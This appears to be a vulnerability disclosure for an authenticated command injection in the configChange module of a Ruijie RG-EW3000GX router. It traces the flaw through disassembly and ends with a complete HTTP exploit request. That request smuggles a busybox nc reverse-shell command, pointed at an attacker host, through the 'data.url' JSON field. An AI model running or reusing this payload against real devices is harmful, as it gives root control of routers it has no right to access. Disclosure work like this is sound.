# Ruijie RG-EW3000GX

- Vendor：Ruijie
- Product：AX3000 Dual-Band Wi-Fi 6 Wireless Router
- Product Model：RG-EW3000GX
- Firmware Version：EW_3.0(1)B11P380,Release(12222219)
- Vulnerability Type：Authenticated Command Injection

# Description

A command injection vulnerability exists in the built-in plugin module `configChange` of the `unifyframe-sgi.elf` backend service on the Ruijie Reyee RG-EW3000GX router (firmware version EW_3.0(1)B11P380). The `cc_set` handler (at address 0x414D58) of the `configChange` module calls `uf_get_url_config`, which directly concatenates the attacker-controlled JSON field `data.url` into a shell command line and executes it via `popen()`. Since the web management interface only requires a valid admin session  (sid), any authenticated user can exploit this vulnerability to execute  arbitrary commands as root.



# Impact

An authenticated attacker can execute arbitrary commands with **root** privileges, leading to full compromise of the device (reading `/etc/rg_config/admin` ciphertext, dumping configs, installing persistent backdoors, pivoting into the internal network).



# Vulnerability Details

Load `/usr/sbin/unifyframe-sgi.elf` into IDA and locate the function `module_init_configChange`.

![image-20260818114034307](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818114034307.png)

Look at a few key actions here: it sets the module name to `configChange`, and then binds it to **`sub_414D58`**. Double-click to enter.

![image-20260818115206988](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818115206988.png)

Retrieve the values of the three parameters `url`, `module`, and `function`, and assign the value of `url` to a string.

![image-20260818115258277](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818115258277.png)

Going further down here, it actually does a little bit of checking — it verifies whether `string` contains `$(` or backticks. Then it uses `snprintf` to concatenate the string, and finally passes it to `ufm_popen`, which is `popen`, to execute the command.

exp

```http
POST /cgi-bin/luci/api/cmd?auth=这里填认证后的token HTTP/1.1
Host: 10.44.77.254
Content-Length: 202
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Origin: http://10.44.77.254
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"method":"devConfig.set","params":{"module":"configChange","data":{
       "url":"http://127.0.0.1/\";busybox nc 10.44.77.10 4444 -e /bin/sh;\"",
       "module":"hostName","function":"dev_config"}}}
```

**Execution result**

![image-20260818120444641](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818120444641.png)

